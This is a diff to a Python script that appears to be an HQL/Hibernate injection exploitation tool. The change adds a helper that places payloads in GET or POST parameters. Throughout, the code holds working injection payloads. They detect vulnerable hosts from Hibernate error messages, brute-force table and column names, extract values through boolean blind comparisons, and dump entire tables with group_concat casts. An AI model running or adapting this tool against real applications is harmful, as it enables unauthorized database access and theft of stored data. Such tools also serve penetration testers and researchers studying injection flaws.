@@ -53,13 +53,24 @@ def table_exists(message):
         return True
 
 def check_if_host_vulnerable(url, params, param_to_test):
-    params[param_to_test] = "'"
+    params = set_payload_in_param(params, param_to_test, "'")
 
     req = send_HTTP_request(url, params)
     if ('org.hibernate.QueryException' in req.content):
         print "Host seems vulnerable."
     else:
         raise Exception('No Query Exception in the HTTP response.')
+
+def set_payload_in_param(params, param_to_test, payload):
+    if (param_to_test not in params):
+        if (param_to_test not in params['postdata']):
+            print "ERROR: No " + param_to_test + " in params"
+        else:
+            params['postdata'][param_to_test] = payload
+    else:
+        params[param_to_test] = payload
+    return params
+
 
 ###########################
 ### Tables
@@ -78,7 +89,7 @@ def find_tables(url, params, param_to_test, file_table):
         find_table(url, params, param_to_test, table)
 
 def find_table(url, params, param_to_test, table_name):
-    params[param_to_test] = "'and (select count(*) from " + table_name + ") >= 0 or ''='"
+    params = set_payload_in_param(params, param_to_test, "'and (select count(*) from " + table_name + ") >= 0 or ''='")
     req = send_HTTP_request(url, params)
     if (table_exists(req.content)):
         insert_table_name_in_tables(table_name)
@@ -116,7 +127,8 @@ def find_column(url, params, param_to_test, table, column_name):
         if (table not in TABLES):
             raise Exception('Table ' + table + ' does not exist ?')
 
-    params[param_to_test] = "'and (select count(w." + column_name + ") from " + table + " w) >= 0 or ''='"
+
+    params = set_payload_in_param(params, param_to_test, "'and (select count(w." + column_name + ") from " + table + " w) >= 0 or ''='")
     
     req = send_HTTP_request(url, params)
     if (column_exists(req.content)):
@@ -189,18 +201,18 @@ def retrieve_count_or_length(url, params, param_to_test, message, request, isCha
         sup_str = '{:g}'.format(sup)
 
         if (isChar):
-            params[param_to_test] = request + " = CHAR(" + inf_str + ") or ''='"    
+            params = set_payload_in_param(params, param_to_test, request + " = CHAR(" + inf_str + ") or ''='")
         else:
-            params[param_to_test] = request + " = " + inf_str + " or ''='"    
+            params = set_payload_in_param(params, param_to_test, request + " = " + inf_str + " or ''='")
         
         req = send_HTTP_request(url, params)
         if (message in req.content):
             break
     
         if (isChar):
-            params[param_to_test] = request + " >= CHAR(" + sup_str + ") or ''='"
+            params = set_payload_in_param(params, param_to_test, request + " >= CHAR(" + sup_str + ") or ''='")
         else:
-            params[param_to_test] = request + " >= " + sup_str + " or ''='"
+            params = set_payload_in_param(params, param_to_test, request + " >= " + sup_str + " or ''='")
 
         req = send_HTTP_request(url, params)
         if (message in req.content):
@@ -250,7 +262,7 @@ def list_columns(url, params, param_to_test):
 
     global TABLES
     columns = []
-    params[param_to_test] = "' and test=1 and ''='"
+    params = set_payload_in_param(params, param_to_test, "' and test=1 and ''='")
 
     req = send_HTTP_request(url, params)
     if ('not found; SQL statement' in req.content):
@@ -287,7 +299,7 @@ def display_message(message):
 ###########################
 
 def dump_table_by_column(url, params, param_to_test, table, column):
-    params[param_to_test] = "'and (select cast(concat('///', group_concat(" + column + "), '///') as string) from " + table + ")=1or ''='"
+    params = set_payload_in_param(params, param_to_test, "'and (select cast(concat('///', group_concat(" + column + "), '///') as string) from " + table + ")=1or ''='")
     req = send_HTTP_request(url, params)
     results = get_result_from_dump(req.content)
     print "[" + table + "]\n\t[" + column + "]"
